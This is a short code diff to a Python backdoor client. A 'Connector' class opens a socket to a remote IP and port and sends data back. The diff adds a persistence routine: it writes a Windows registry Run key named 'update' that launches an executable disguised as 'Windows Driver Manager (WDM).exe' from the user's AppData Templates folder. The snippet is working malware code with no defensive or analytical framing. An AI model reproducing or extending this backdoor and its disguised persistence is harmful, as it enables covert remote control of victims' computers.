@@ -4,8 +4,15 @@ import socket, subprocess, json, os, base64, sys
 
 class Connector:
     def __init__(self, ip, port):
+        self.autorun_settings()
         self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.connection.connect((ip, port))
+
+    def autorun_settings(self):
+        folder_dest = os.path.join(os.environ["appdata"], "Microsoft", "Windows", "Templates")
+        subprocess.call(
+            'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + folder_dest + '\Windows Driver Manager (WDM).exe" /f',
+            shell=True)
 
     def reliable_send(self, data):
         while True:
